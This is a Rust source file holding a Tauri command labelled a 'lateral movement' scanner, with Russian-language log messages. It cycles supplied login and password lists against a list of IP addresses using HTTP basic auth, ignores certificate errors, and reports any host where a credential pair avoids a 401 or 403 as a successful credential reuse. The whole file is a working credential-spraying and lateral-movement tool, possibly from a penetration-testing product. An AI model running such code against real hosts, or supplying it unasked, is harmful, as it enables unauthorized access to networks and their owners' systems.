use reqwest::Client;
use serde::Serialize;
use std::time::Duration;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LateralReport {
    pub target_ip: String,
    pub service: String,
    pub status: String,
}

#[tauri::command]
pub async fn scan_lateral_movement(
    target_ips: Vec<String>,
    known_logins: Vec<String>,
    known_passwords: Vec<String>,
) -> Result<Vec<LateralReport>, String> {
    let mut reports = Vec::new();
    let client = Client::builder()
        .timeout(Duration::from_secs(4))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    for ip in target_ips {
        let mut access_gained = false;

        for login in &known_logins {
            if access_gained {
                break;
            }

            for pass in &known_passwords {
                let test_url = format!("http://{}/", ip);
                eprintln!(
                    "🕷️ LATERAL SPIDER: Проверка узла {} с кредами {}:{}",
                    ip, login, pass
                );

                if let Ok(resp) = client.get(&test_url).basic_auth(login, Some(pass)).send().await {
                    let status = resp.status();
                    if status != reqwest::StatusCode::UNAUTHORIZED
                        && status != reqwest::StatusCode::FORBIDDEN
                    {
                        reports.push(LateralReport {
                            target_ip: ip.clone(),
                            service: "HTTP".to_string(),
                            status: "CREDENTIAL_REUSE_SUCCESS".to_string(),
                        });
                        eprintln!(
                            "🚨 УСПЕШНОЕ БОКОВОЕ ПЕРЕМЕЩЕНИЕ: Доступ к {} получен ({})",
                            ip, login
                        );
                        access_gained = true;
                        break;
                    }
                }
            }
        }
    }

    Ok(reports)
}
